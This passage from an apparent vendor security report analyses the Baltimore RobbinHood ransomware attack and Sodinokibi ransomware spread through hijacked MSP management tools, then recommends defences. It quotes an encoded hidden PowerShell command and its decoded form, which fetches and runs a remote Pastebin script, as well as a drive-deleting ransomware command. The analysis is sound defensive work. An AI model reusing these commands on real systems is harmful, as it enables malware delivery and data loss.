know in security, nothing is perfect.\n\nThis is where services that can “de-fang” emails like DNSWatch come in.\n\n\n-----\n\n###### Firebox Feed: Defense Learnings\n\n This quarter brought widespread use of popular tools used by both ethical penetration testers\n\n and cyber criminals, from the credential-stealing Mimikatz to several backdoor shell scripts\n\n that come pre-installed in Kali Linux. Even though these tools are widely known, it doesn’t\n\n take much to make them evasive enough to slip past traditional anti-malware services. The\n\n unfortunate reality is, it’s easier than ever for a low-skilled malicious hacker to carry out a\n\n damaging attack using pre-compiled tools. Here are some tips and takeaways to ensure you\n\n and your organization stay safe from the deluge of modern threats.\n\n Authentication Security Using MFA Is Key \n\nThe credential-theft tool Mimikatz has remained a top threat for the last two years,\n\nmirroring the threat landscape trend of attacks most commonly leveraging stolen\n\ncredentials. These days, it isn’t enough to simply use a strong and unique password.\n\n## 1\n\nAttackers have too many ways to steal that password right out from under you,\n\nwhether it be from tools like Mimikatz or through clever phishing attacks.\n\n###### Deploy Advanced Malware Detection Tools \n\nOver 1/3 of all malware detected across WatchGuard customer networks\n\nwas classified as “zero day malware,” meaning it bypassed traditional\n\nsignature-based anti-malware engines. Organizations must deploy\n\nadvanced malware detection tools that use more than just signatures to\n\n## 2\n\ndetect modern-day threats. Services that use machine learning and AI can\n\nhelp quickly predict whether a payload is malicious or not while behavioral\n\ndetection tools can give a definitive thumbs up or down after detonating\n\nmalware in a controlled sandbox.\n\n###### There Is No Such Thing as Too Small a Target \n\nThis quarter saw significant overlap in the most-widespread malware (affecting the\n\nmost individual networks) and the most prolific malware by volume. Automation has\n\nallowed cyber criminals to cast wider nets with their attacks, affecting organizations\n\n## 3\n\nregardless of size. Even if you are a smaller organization, you still need to invest in\n\nprotection and response tools to avoid becoming the next breach statistic.\n\n\n-----\n\n#### Top Security Incidents\n\n\n-----\n\n#### Top Security Incidents\n\n###### The Baltimore Ransomware Attack\n\n\nOn May 7th, 2019, the Baltimore Department\n\nof Public Works tweeted out a message to\n\ninform customers that their email services\n\nhad been interrupted and IT dispatched to\n\nresolve the issue. A few hours later, it would\n\nbecome clear\n\nthat the inci­\n\ndent was far\n\nmore wide­\n\nspread and\n\ndamaging\n\nthan a simple\n\nemail server outage. By the end of the day,\n\nit was publicly known that Baltimore had\n\njust become the latest high-profile victim of\n\nthe global ransomware epidemic.\n\nOver the course of the next few weeks,\n\nBaltimore worked to bring impacted city\n\n\nservices back online, all while the alleged\n\nperpetrator taunted them on Twitter. Bal­\n\ntimore residents were stuck waiting to\n\npay utility bills and parking tickets while\n\ncity employees had to find clever work­\n\narounds to\n\nmaintain their\n\ndepartment’s\n\noperations.\n\nIn this section\n\nof the Internet\n\nSecurity Report, we’ll cover how the Balti­\n\nmore ransomware attack went down from\n\nstart to finish. We’ll clear up some miscon­\n\nceptions and misinformation that spread\n\nin the weeks after the attack and end with\n\nlessons learned from the attack that organi­\n\nzations of all sizes can apply.\n\n\n-----\n\n###### RobbinHood\n\nBy the end of the first day of the attack,\n\nthe local newspaper The Baltimore Sun had\n\nobtained a copy of a ransom note from an\n\ninfected computer that identified the mal­\n\nware as RobbinHood. The note demanded\n\npayment of 3 bitcoins for each computer\n\nor 13 bitcoins (around $75,000 at the time)\n\nin total to unlock every computer. Public\n\ndetails from the city of Baltimore’s internal\n\ninvestigation are understandably sparse, but\n\nthere are a few assumptions we can make\n\nbased off what we know.\n\nDespite reports stating otherwise, including\n\none by the New York Times, Robbinhood\n\ndoes not contain any self-propagation code\n\nlike the EternalBlue exploit that fueled the\n\nWannaCry ransomware attack in early 2017.\n\nDespite the lack of ‘worm’ code, the ran­\n\nsomware still spread quickly across multiple\n\ncity departments. This indicates the attacker\n\nlikely had access to elevated credentials and\n\nsoftware distribution tools often found on\n\ndomain controllers and other administrative\n\nservices.\n\nWhile different than automatic self-replica­\n\ntion, this method of delivery isn’t exactly\n\nnew. Much of the malware that we detect in\n\nthe WatchGuard Threat Lab is multi-stage.\n\nThe first stage, the dropper, is in charge of\n\nscouting out the area. In more sophisticated\n\nattacks, the dropper checks the current\n\noperating system and then downloads a\n\nsecond stage with additional functionality\n\nincluding tools to identify vulnerable appli­\n\ncations and elevate privilege levels.\n\n\nIn the case of the Baltimore attack, a likely\n\nscenario involves a city employee falling vic­\n\ntim to a phishing email. The attacker could\n\nthen trick the employee into either giving\n\nup their credentials directly or installing a\n\nremote access trojan to give the attacker a\n\nfoothold in the network.\n\nThere is additional evidence that the attack­\n\ner distributed the ransomware from a central\n\nlocation. One of the first activities the ran­\n\nsomware takes is to check if a cryptographic\n\npublic key exists in the c:\\windows\\temp\n\ndirectory and exits execution if it does not\n\nfind the key. To deploy this key alongside\n\nthe ransomware to each target computer at\n\na rapid pace, the attacker must have used\n\nsome form of centralized deployment tool.\n\nRobbinhood includes another interesting\n\nfeature that makes it different from the\n\nmore common ransomware variants spread­\n\ning around this year. Early in its execution,\n\nit attempts to remove all attached network\n\ndrives with the command cmd.exe /c net\n\nuse * /DELETE /Y. This differs from recent\n\nransomware trends, which try to encrypt the\n\ndata stored on all network-accessible drives.\n\nIt is unlikely that the malware author would\n\nskip opportunities to encrypt more data,\n\nwhich means they likely had plans to infect\n\nand encrypt those network storage devices\n\ndirectly instead of through the mapped\n\ndrive.\n\n\n-----\n\n###### The Damages\n\nOn the first day directly after the infections\n\nstarted, at least a dozen agencies, ranging\n\nfrom the Department of Public Works to the\n\npolice department, were locked out of their\n\nemail. Many of the same agencies were also\n\nlocked out of voice services, likely due to\n\ncritical Voice Over IP (VoIP) infrastructure\n\nfalling victim to the ransomware.\n\nFive days after the attack, a (now deacti­\n\nvated) twitter account began taunting the\n\ncity over the non-payment of the ransom\n\ndemands. The account posted pictures of\n\nsensitive documents allegedly stolen during\n\nthe attack. If the documents are legitimate,\n\nit further credits the theory that the attack­\n\ner had elevated access on the city’s network.\n\n\nRegardless of how the attack started, in the\n\nend, the damages were borderline cata­\n\nstrophic. Baltimore is only just now nearing\n\n100% functionality after having to rebuild\n\nmany of their critical systems. The city esti­\n\nmates that the total cost of the attack will\n\nbe around $17 million dollars, a significantly\n\nlarger amount than the original $75,000\n\nransom demands.\n\nYou might ask, why not just pay the ransom?\n\nWhile there is the chance that by paying the\n\nransom the city would receive the cryp­\n\ntographic keys required to unlock all of their\n\nfiles, that isn’t a guarantee. The only guaran­\n\ntee from paying the ransom is that the cyber\n\ncriminal now has additional funding and\n\nincentive to execute future attacks.\n\n\n-----\n\n###### Lessons Learned\n\n\n###### There are lessons to be learned from this and previous ransomware attacks. Because they\n\n were unprepared for the attack, Baltimore was placed in the difficult position where they had\n\n to choose between funding criminals and paying millions to restore services. Unfortunately\n\n for the city, hindsight is 20-20 and it’s too late for them to roll back time to before the attack.\n\n For other cities and organizations though, it isn’t too late and there are steps you can take to\n\n ensure you don’t end up like Baltimore.\n\n Deploy and Test Backup Solutions \n\nNever put yourself in a situation where the only possible option to regain access to\n\nyour files is paying the attacker. Automated backups are an important part of any\n\nlayered security approach to allow you to recover from a devastating incident. That\n\n## 1\n\nsaid, backups on their own aren’t enough. You must test your restoration process as\n\nwell to ensure it will work when it becomes needed.\n\n###### Train Your Users to Spot Phishing Attacks \n\nMost signs point towards a phishing email being the initial attack vector for\n\nthe Baltimore attack. Cyber criminals love to pray on unsuspecting users,\n\ntricking them into willfully giving up their credentials or running malicious\n\napplications. While phishing awareness training will never reduce your click\n\n## 2\n\nrate to zero, it will at least give your technical controls a fighting chance\n\nwhen the inevitable convincing email comes through.\n\n###### Deploy Tools That Can Detect A Breach \n\nThe alleged perpetrator of the Baltimore ransomware attack posted images of\n\ndocuments indicating they had been on the network for at least a short while before\n\nexecuting the ransomware. Endpoint Detection and Response (EDR) agents can help\n\n## 3\n\nidentify suspicious behavior that slips past your other defenses and remediate them\n\nbefore they escalate into a devastating attack.\n\n\n-----\n\n#### WatchGuard Threat Lab Research\n\n\n-----\n\n##### Three MSPs Hijacked to Spread Ransomware\n\nDuring Q2 2019, at least three managed service providers (MSPs)\n\nsuffered network breaches that allowed the attackers to leverage **What is an MSP?**\n\nlegitimate management systems to spread the Sodinokibi\n\nA managed service provider\n\nransomware to the MSPs’ customers. As news of these attacks\n\n(MSP) is a company you can\n\nsurfaced, our threat team was in the unique position to receive\n\noutsource your IT to. MSPs\n\nsome of the malware samples from one of the affected MSPs. In this\n\nare very popular with small\n\nsection, we detail what we know about these Q2 MSP attacks, and\n\nand midsize businesses\n\nwhat we learned from the malware samples we received. We also\n\n(SMBs) who do not have their\n\nshare security strategies that all MSPs should implement to avoid\n\nown IT resources. Rather than\n\nthese types of trending attacks in the future.\n\ntrying to recruit the expertise\n\n###### Story Overview to build an IT department\n\ninternally, many companies\n\n[On June 20th, reports leaked of at least three MSPs that were](https://www.msspalert.com/cybersecurity-breaches-and-attacks/ransomware/hackers-hit-msp-software/)\n\nchoose to outsource it to an\n\nhijacked and exploited to deliver ransomware to their customers.\n\nMSP so they can focus on\n\nAt the time, most of the information about the attack came from\n\ntheir own business instead.\n\n[a Reddit post and some excellent analysis done by Huntress Labs. A](https://www.reddit.com/r/msp/comments/c2wls0/kaseya_weaponized_to_deliver_sodinokibi_ransomware/)\n\nday later, an affected MSP shared some of the malware samples\n\nAt WatchGuard, we value\n\nassociated with this attack with our team, giving us a bit more\n\nMSPs as they allow smaller\n\ninsight into the attacks. Before looking at those samples, let’s\n\ncompanies to build more\n\nquickly detail what we know about the attacks so far.\n\nsophisticated IT infrastruc­\n\nBefore we talk about the Q2 attacks, know this is not the first time ture than they might have\n\n[that cyber criminals have hacked MSPs. Last February, at least four](https://www.msspalert.com/cybersecurity-breaches-and-attacks/ransomware/hackers-target-connectwise-plugin-to-kaseya-platform/) been able to on their own.\n\n**[MSPs got hijacked and exploited to spread the Gandcrab ransomware to](https://www.msspalert.com/cybersecurity-breaches-and-attacks/ransomware/hackers-target-connectwise-plugin-to-kaseya-platform/)** MSPs sometimes also offer\n\nmany of their customers. At the time, the root cause for that attack specialized IT services, such\n\nwas quite clear. MSPs leverage many industry-specific tools like as cyber security, which\n\n**[remote monitoring and management (RMM) solutions and professional](https://www.techopedia.com/definition/28529/remote-monitoring-and-management-rmm)** small businesses often\n\n**[service automation (PSA) platforms from companies like Kaseya,](https://en.wikipedia.org/wiki/Professional_services_automation)** don’t have the specialized\n\nConnectWise, and Autotask. These tools essentially allow MSPs to expertise to use otherwise.\n\nremotely manage and monitor the IT systems and endpoint clients That said, since MSPs tend\n\nat their customer sites. During the Q1 attacks, the criminal actors to have remote privileged\n\n[targeted an older SQL Injection vulnerability (CVE-2017-18362) in the](https://blog.huntresslabs.com/cve-2017-18362-arbitrary-sql-injection-in-mangeditsync-integration-ba142ff24f4d) access to all of their cus­\n\nConnectWise ManagedITSync plug-in for the Kaseya VSA RMM. If tomers networks, they make\n\nyou exposed this system externally and hadn’t patched, attackers a great target for attackers.\n\ncould exploit that flaw to do anything you could within the Kaseya If an attacker can hijack an\n\nRMM, which pretty much gave them the keys to the kingdom, and a MSP, they own all that MSP’s\n\nmeans with which to install ransomware through management tools. customers.\n\nThe Q2 attacks differ slightly in that we don’t know their root cause.\n\nUnlike the aforementioned attack, the community is unaware of any\n\nsingle root vulnerability used in these attacks. That said, the attacks\n\ndo share some commonalities.\n\n\n-----\n\n1. **The attacker gained access to privileged credentials. In all the latest MSP breaches, the**\n\nattackers leveraged weak, stolen, or leaked credentials to gain administrative access to\n\nlegitimate management tools. What we don’t know is how the attacker gained access to\n\nthe first credential. Possibilities range from phishing attacks, database leaks combined\n\n[with password reuse, or good old-fashioned brute force attacks (of exposed login pages).](https://en.wikipedia.org/wiki/Brute-force_attack)\n\nAttackers may have even leveraged some unknown software vulnerability, and then taken\n\nadvantage of system access and tools like Mimikatz to harvest credentials. That said,\n\nthere is no evidence yet of any common software exploit among all these hacks. In any\n\ncase, we do know the attackers did somehow harvest one or more privileged credentials,\n\nand then they simply used those credentials to access the MSP’s management tools in the\n\nsame way employees would.\n\n2. **The attackers targeted exposed remote management services. In many of these**\n\nattacks, the MSP may have exposed various remote management services online, such\n\n[as Microsoft’s Remote Desktop Protocol (RDP) or one of the several management portals](https://en.wikipedia.org/wiki/Remote_Desktop_Protocol)\n\nthat might ship with various MSP tools. These remote management tools were somehow\n\ninvolved in the attacks. They may have been what allowed attackers to gain access to\n\ncredentials (by brute forcing or leveraging vulnerabilities to gain privileged access) and\n\nat the very least they allowed the attacker to gain remote access to systems once they\n\nhad legitimate credentials.\n\n3. **The attackers exploited the MSPs’ own tools against them. Once the attacker gained**\n\naccess to a privileged credential, they did not have to exploit any sophisticated\n\nvulnerability to spread their ransomware. Rather, they simply logged into a management\n\ntool (like an RMM or some central management platform) and used that legitimate tool\n\nto disable security controls and install their ransomware on as many victim machines as\n\npossible.\n\n4. **Some attacks involved Webroot’s central management. The Webroot management**\n\nconsole (SecureAnywhere) was one of the specific MSP tools exploited in these attacks.\n\nAmong other things, this central management console allows administrators to remotely\n\nexecute scripts and commands on any Windows endpoint under management. According\n\nto the MSP who shared samples with us, the attackers ran their original malicious\n\nPowerShell script (which we’ll analyze later) on all the victims’ machines via the Webroot\n\n[management console. Huntress Labs confirms this vector of attack and even captured an](https://www.bleepstatic.com/images/news/ransomware/s/Sodinokibi/wider-distribution/webroot-powershell-log.jpg)\n\n**[image of the malicious PowerShell being executed from a victim’s Webroot](https://www.bleepstatic.com/images/news/ransomware/s/Sodinokibi/wider-distribution/webroot-powershell-log.jpg)**\n\nmanagement logs.\n\nIt’s important to note that there was no underlying vulnerability in the Webroot\n\nmanagement console. The attackers simply had access to a credential with valid\n\nprivileges.\n\n\n-----\n\n_Figure 16: Image of Affected MSP’s Webroot Management Logs, Courtesy of Huntress Labs_\n\n5. **The attackers disabled security controls. Using the same MSP tools mentioned,**\n\nthe attackers were able to disable important security controls before launching the\n\nransomware install. They disabled antivirus clients, like the Webroot or ESET, and in some\n\ncases even deleted and disabled Veeam backup systems.\n\n6. **They used PowerShell to stage and deliver the malware.** **[PowerShell is a perfectly](https://en.wikipedia.org/wiki/PowerShell)**\n\nlegitimate and powerful Windows scripting language IT admins can use to do just about\n\nanything on a Windows computer. Unfortunately, cyber criminals have increasingly started\n\nexploiting PowerShell in their attacks since it helps stage malware delivery in ways that\n\nevade legacy security controls. In this case, the attacker specifically used functionality\n\n[from a well-known PowerShell penetration testing framework called PowerSploit to help](https://github.com/PowerShellMafia/PowerSploit)\n\ndeliver and load the actual ransomware (see the upcoming sample analysis).\n\n7. **The attackers installed the Sodinokibi ransomware. In the end, the goal of the attack**\n\nwas simple; to install ransomware on as many computers as possible, whether owned by\n\nthe MSP or their customers. By leveraging the MSP’s management tools, the attackers\n\nhad access to all the customer endpoints under management, making it easy to install\n\nransomware widely.\n\nIn summary, these MSP attacks were essentially due to credential theft, combined with the\n\nnefariously smart use of legitimate MSP management tools to distribute ransomware.\n\n\n-----\n\n###### MSP Malware Sample Analysis\n\nNow you know how these attacks generally worked, let’s look at the samples we received.\n\nThe malware payload involved three parts:\n\n1. The malicious PowerShell downloader script that grabs a malicious payload from the\n\nInternet\n\n2. The malicious PowerShell injector module that loads the ransomware in a victim\n\ncomputer’s memory\n\n3. The ransomware itself\n\nLet’s take a look at each of these pieces.\n\n###### The PowerShell Downloader Script\n\nAccording to our MSP contact, once the attacker had a privileged credential, they logged\n\n[into the Webroot management console and used its ability to run DOS commands to launch](https://docs.webroot.com/us/en/business/wsab_endpointprotection_adminguide/Content/ManagingEndpoints/IssuingCommandsToEndpoints.htm)\n\nthe following command:\n```\ncmd.exe /c START\nC:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -e\nSQBmACgAJABFAE4AVgA6AFAAUgBPAEMARQBTAFMATwBSAF8AQQBSAEMASABJAFQARQBDAFQAVQBSAEUAIAA­\ntAGMAbwBuAHQAYQBpAG4AcwAgACcAQQBNAEQANgA0ACcAKQB7ACAAUwB0AGEAcgB0AC0AUAByAG8AYw­\nBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAIgAkAEUAbgB2ADoAVwBJAE4ARABJAFIAXABTAHkAcwBX­\nAE8AVwA2ADQAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcA­\nZQByAHMAaABlAGwAbAAuAGUAeABlACIAIAAtAGEAcgBnAHUAbQBlAG4AdAAgACIASQBFAFgAIAAoACgAbgBlAH­\ncALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZA­\nBzAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHAAYQBzAHQAZQBiAGkAbgAuAGMAbwBtAC8AcgBhAH­\ncALwBOAHAARQA4AEQAagBlADkAJwApACkAOwBJAG4AdgBvAGsAZQAtAFAARgBCAFUATQBGAE0ARgBIADsAU­\nwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBzACAAMQAwADAAMAAwADAAMAA7ACIAfQBlAGwAcwBlAHsAIABJA­\nEUAWAAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4AZ­\nABvAHcAbgBsAG8AYQBkAHMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcABhAHMAdABlAGIAaQBuA­\nC4AYwBvAG0ALwByAGEAdwAvAE4AcABFADgARABqAGUAOQAnACkAKQA7AEkAbgB2AG8AawBlAC0AUABGAEIAVQB­\nNAEYATQBGAEgAOwBTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAHMAIAAxADAAMAAwADAAMAAwADsAIAB9AA\n\n```\nThe DOS command uses the Windows command line utility (cmd.exe) to start PowerShell in\n\n[a hidden mode, without any local profile scripts. The attacker uses basic base64 encoding to](https://en.wikipedia.org/wiki/Base64)\n\nobfuscate the actual contents of the full PowerShell script. Here is the decoded red script:\n```\nIf($ENV:PROCESSOR_ARCHITECTURE -contains ‘AMD64’){ Start-Process -FilePath\n“$Env:WINDIR\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe” -argument “IEX\n((new-object net.webclient).downloadstring(‘https://pastebin.com/raw/NpE8Dje9’));­\nInvoke-PFBUMFMFH;Start-Sleep -s 1000000;”}else{ IEX ((new-object net.webclient).\ndownloadstring(‘https://pastebin.com/raw/NpE8Dje9’));Invoke-PFBUMFMFH;Start-Sleep -s\n1000000; }\n\n```\nThat decoded PowerShell script checks whether the endpoint is a 64-bit system or not and\n\nsets environmental attributes accordingly, then it downloads the contents of a Pastebin page\n\nas a string, which it runs with PowerShell.\n\n\n-----\n\n|Download and run a file|Specify a file’s direct URL to download it to the agent, and then run it remotely at the system level. You can also enter command-line options; for example, you could specify the /s parameter so that the file you download runs silently in the background. Command-line options must be supported by the file you are downloading and executing. This command runs on both PC and Mac endpoints.|\n|---|---|\n|Run a DOS command|Specify the DOS command to run remotely at the system level, which is useful for simple changes or for running a script. Keep in mind that the Management Portal will not display results. This command runs on PC endpoints, and can be used to run shell commands on Mac endpoints.|\n|Run a registry command|Specify the registry command to run remotely at the system level. This com­ mand uses the same syntax as reg.exe, but does not call reg.exe. You can only refer directly to local registry hive paths, for example, HKLM\\Software\\. You cannot include the name of the computer in the path. This command runs only on PC endpoints.|\n\n\n_Figure 17: Excerpt from Webroot manual on using the central management tool to execute_\n\n[Kyle Hanslovan of Huntress Labs, found almost identical PowerShell commands being run in](https://gist.githubusercontent.com/KyleHanslovan/e261e5f357c4796d9f1d4ee2b0112218/raw/301277d59299580a08f281528e734a1c8c47e286/webroot_payload.ps1)\n\nother victims’ Webroot consoles, the only difference being slightly different Pastebin links.\n\nTheir team also noticed that this original command was found in a file named 1488.bat.\n\n###### Secondary PowerShell Injector Script\n\nSince the original attack, all of the Pastebin links hosting the secondary payload have been\n\nremoved. However, our MSP contact shared the contents of one of these links with us, cap­\n\ntured before the link was pulled down.\n\n[The Pastebin link hosted a couple-thousand-line PowerShell script with an encoded portable](https://en.wikipedia.org/wiki/Portable_Executable)\n\n**[executable (PE) embedded at the end. You can see a glimpse of this large PowerShell script](https://en.wikipedia.org/wiki/Portable_Executable)**\n\nin Figure 18, but it is much too long to show in its entirety. If you want to see the complete\n\n[script, we have uploaded it to a file share, with most of the malicious PE contents removed](https://gofile.io/?c=9KTIkO)\n\nfor safety. While the modified script can no longer install ransomware (especially in its PDF\n\nformat), do know that some security controls may recognize the malicious script and give\n\nyou warnings on the file.\n\n\n-----\n\n_Figure 18: Beginning excerpt of thousand+ line malicious PowerShell injector script_\n\nNormally, it could have taken hours to analyze such a long and complex PowerShell script.\n\nHowever, upon initial examination we recognized aspects of the script and connected it to a\n\nwell-known PowerShell exploit toolkit called PowerSploit.\n\n**_[PowerSploit is a collection of pre-written PowerShell modules that aid in penetration test­](https://powersploit.readthedocs.io/en/latest/)_**\n\ning. While created by researchers, PowerSploit is often leveraged by cyber criminals. This\n\n[malicious script is an almost line-by-line copy of PowerSploit’s Invoke-ReflectivePEInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1)\n\nmodule, with a few basic modifications. The attackers simply changed the name of some\n\nof the script’s core functions (like the main function Invoke-ReflectivePEInjection), likely to\n\ntry to obfuscate that it was a common PowerSploit module. They also removed the default\n\ncomments in the original PowerSploit module. Finally, they embedded a specific PE file in\n\ntheir malicious payload – at the end of the script (which we’ll analyze last).\n\n_Figure 19: Excerpt of the Malicious PE File Embedded in the PowerShell Injector Script_\n\n\n-----\n\nIn a nutshell, the Invoke-ReflectivePEInjection module uses PowerShell to load a malicious\n\nDLL or EXE into the memory of another running process. It either does so by reflectively\n\nloading the DLL or EXE into the PowerShell process itself, or by reflectively loading a DLL\n\ninto a remote process’s memory. In effect, this makes the malicious executable fileless\n\nmalware. Unless that executable creates its own files at runtime, this PowerSploit module\n\ndoesn’t write any files to disk, making it harder for legacy endpoint security controls to\n\ndetect and block.\n\n###### Analyzing the Embedded PE File: Sodinokibi Ransomware\n\nThat brings us to the third and final piece of this staged threat, the embedded PE file. After\n\ndecoding the embedded PE file, we quickly learned it was a pretty normal variant (MD5:\n\n**[11bfa9bc7563e823048440233143c0d56894dee97d4de9d3218e4f98a4b05c86) of the common](https://www.virustotal.com/gui/file/11bfa9bc7563e823048440233143c0d56894dee97d4de9d3218e4f98a4b05c86/detection)**\n\n**[Sodinokibi ransomware.](https://securityboulevard.com/2019/05/sodinokibi-ransomware-poised-to-impact-larger-enterprises/)**\n\nIn effect, Sodinokibi is like any other ransomware you’ve seen or heard of. It encrypts\n\na bunch of your important files, renaming them with a unique (to the victim) five- to\n\nnine-character extension. It then changes your background and pops up messages to display\n\n[the extortion request. As usual, it guides you to an .onion (Tor) link to get the decryption](https://en.wikipedia.org/wiki/Tor_(anonymity_network))\n\nkeys after you pay the ransom.\n\nThat said, Sodinokibi can be more evasion than the average ransomware. This sample had\n\ncode to elevate its privilege to kernel level, giving it more powerful capabilities. It also could\n\nswitch between 32- and 64-bit processing modes, which sometimes helps malware escape\n\nemulation sandboxes. It also tries to enumerate the computer’s keyboard layout and disk\n\nsize, which are both evasion techniques used by malware to identify the specific type of\n\nsystem its running on. This sometimes helps the malware tell if it’s running in a virtualized\n\nenvironment or a real system.\n\n_Figure 20: Malicious Behaviors Detected in the Sodinokibi Ransomware from WatchGuard’s APT Blocker Service_\n\n\n-----\n\nIn any case, the PE file embedded in the PowerShell injector script was a pretty standard\n\nversion of Sodinokibi. If you’d like to know more about the Sodinokibi ransomware, we\n\n[recommend this analysis from Cylance, one of WatchGuard’s partners.](https://threatvector.cylance.com/en_us/home/threat-spotlight-sodinokibi-ransomware.html)\n\nFor WatchGuard Firebox owners, all three of our preventative anti-malware services – Gate­\n\nway AntiVirus (GAV), IntelligentAV (IAV), and APT Blocker – were able to detect this variant\n\nof Sodinokibi when downloaded through one of our proxy services. In fact, our GAV service\n\neven detects and blocks the malicious PowerShell scripts associated with these attacks.\n\n###### Conclusion and Takeaways\n\nThe Q1 and Q2 MSP hacks make it clear that attackers are specifically targeting MSPs. This\n\nmakes obvious sense from an attacker perspective. If I can hijack an MSP, I also gain access\n\nto all that MSP’s customers – dozens of victims for the price of one. The attackers carrying\n\nout these attacks have spent the time to study MSPs. They know how MSPs work and the\n\nspecific tools they use. In fact, they specifically are leveraging those legitimate tools to help\n\ntheir attack keep under the radar and appear benign.\n\nNow that these attackers have found a ripe vector of attack, we expect these sorts of\n\nMSP-targeted attacks to increase, and even accelerate. In fact, while we wrote this report\n\n(during Q3 2019), we saw two more big ransomware incidents involving MSPs and service\n\nproviders. If you are an MSP, managed security service provider (MSSP) or a Cloud service\n\nprovider (CSP), you should take these breach examples very seriously, and do everything in\n\nyour power to protect your infrastructure and customers. According to Huntress Labs, some\n\nof the affected MSPs have had over 2,000 managed customer computers encrypted and had\n\nto pay hundreds of thousands in ransom when they couldn’t recover. An event like that could\n\nput an MSP out of business.\n\n**So, what can you do to protect yourself?**\n\nWell, there is no silver bullet defense, especially where sophisticated attackers are con­\n\ncerned. The latest MSP attacks have no single root cause, and advanced attackers often\n\nleverage a wide variety of attack techniques for different victims. However, these particular\n\nattacks do share commonalities, the most important being stolen credentials. The best thing\n\nyou can do to protect yourself is to widely deploy multi-factor authentication throughout\n\nyour organization, especially on important management platforms. Here are our tips:\n\n- **Use multi-factor authentication (MFA) throughout your enterprise. These attacks**\n\nabused stolen credentials to gain access to your management tools. MFA is the only\n\nthing that really protects you against this sort of credential theft and abuse. Even\n\nif an attacker was able to learn one of your RMM admin passwords, MFA solutions\n\ncould prevent those attackers from being able to log in with that password. We highly\n\nrecommend you implement MFA throughout your organization, including your enterprise\n\nlogin, RDP sessions, VPN, internal management systems, and SaaS applications. Solutions\n\nlike WatchGuard’s AuthPoint offer MFA for all these use cases, and we recommend\n\nyou use it, or at least other MFA products like it. If, for whatever reason, you can’t yet\n\nimplement enterprise-wide MFA, we at least recommend you setup MFA in all your\n\n\n-----\n\ncritical applications that support it – at the very least your RMM solution. Products like\n\nWebroot Management Console and Kaseya VSA do support MFA. In fact, Webroot made\n\nit mandatory after this attack. MFA alone could have significantly mitigated, or even\n\nprevented this attack.\n\n**Patch public-facing software aggressively. The older MSP attack from February**\n\nexploited an old and critical flaw a ConnectWise plug-in for Kaseya VSA. ConnectWise\n\nfixed the flaw in 2017, yet some MSPs remained vulnerable. Learn from them by making\n\nsure you keep your critical software up to date, especially the powerful management\n\ntools you use to access your clients’ endpoints and network appliances. We actually\n\ndon’t believe the ConnectWise plug-in flaw is associated with these newer attacks, nor\n\ndo we think they are exploiting some new flaw in your RMM or endpoint management\n\ntools. Rather, they are simply accessing your tools with stolen credentials. Nonetheless,\n\nyou should still make sure to keep your MSP software patched just to be safe. We also\n\nsuggest you check your Windows and RDP patch levels at your and your customers’ sites.\n\nMicrosoft recently fixed a very critical flaw in RDP, which could be one of the attack\n\nvectors used in these incidents, and exploit code has been made public for this flaw.\n\n[Make sure you’ve patched BlueKeep.](https://en.wikipedia.org/wiki/BlueKeep)\n\n- **Place stronger ACLs on remote management and use VPN. As an MSP, there are likely a**\n\nnumber of network services that you have to expose publicly, both from your customer\n\nnetwork and your own, in order to provide remote management services. For instance,\n\nyou may have exposed RDP from a number of sites so your techs can manage desktops.\n\nYou might even have exposed your RMM login interface publicly, so that reps can log\n\nin from wherever they happen to be. You also probably have to open various network\n\nservices to allow endpoint management solutions and other products to work. As you\n\nare allowing for these management capabilities, consider their security as well. Apply\n\n**[the principle of least privilege and try to limit access to these network services to as few](https://en.wikipedia.org/wiki/Principle_of_least_privilege)**\n\nIPs or users as possible. For instance, don’t just open RDP access to the world if you can\n\ninstead limit access from a few IPs. Better yet, require VPN for all remote management\n\nservices. WatchGuard Fireboxes allow you to make very granular, user-centric policies\n\nand offer multiple remote VPN solutions.\n\n- **Use advanced anti-malware services on your network and endpoints. Even run-of-**\n\nthe-mill malware has become much more evasive and sophisticated lately. This attack\n\nin particular uses PowerShell to stage its malware delivery, which can sometimes\n\nbypass older network and endpoint controls. It uses a PowerSploit function to load the\n\nransomware directly into memory, making it fileless and thus able to skirt file-centric\n\nprotections. Even the ransomware executable itself has some malware sandbox evading\n\ncapabilities. If you mostly rely on traditional signature-based anti-malware solutions\n\nto protect your company and clients, it will likely miss many aspects of this and other\n\nattacks.\n\n\n-----\n\nNowadays, you need to implement different types of anti-malware on both your network\n\nand endpoints. We recommend you use more modern anti-malware solutions that\n\nleverage behavioral analysis and machine learning to detect new malware variants that\n\nsignatures might miss. You should also implement some sort of endpoint detection and\n\nresponse solution that roots out malware that does make it onto one of your endpoints.\n\nIf you are a WatchGuard customer, our Total Security services include four anti-malware\n\nservices that provide very rich coverage. They include Gateway AntiVirus (GAV),\n\nIntelligentAV (IAV), APT Blocker, and Threat Detection and Response (TDR). Both our\n\nGAV and APT Blocker services detect the Sodinokibi ransomware, and the PowerShell\n\nscripts used in this attack, when they are passed over the network gateway. However,\n\nrealize that attackers can use other delivery methods that might evade network\n\ndetection. You should pair these services with endpoint protection as well, such as our\n\nTDR service or other endpoint protection products.\n\n- **Backup your customers’ and your data regularly. While obvious, maintaining regular**\n\nand rigorous online and offline backups of you and your customers’ data can make it\n\nmuch easier to recover from these sorts of attacks. However, these sophisticated actors\n\nsometimes target your backups as well, and have been seen to remove the Veeam backup\n\nagent. We recommend you maintain a few sources of backup and keep offline copies\n\nas well.\n\nAs technically complex as these MSP attacks were, at their core they were essentially\n\ncredential theft. Authentication is the cornerstone of all security. If an attacker can\n\nmasquerade as you, they can do anything you’re able to. The best way to secure\n\nauthentication is MFA. Deploy it internally and at your customer sites.\n\n\n-----\n\n#### 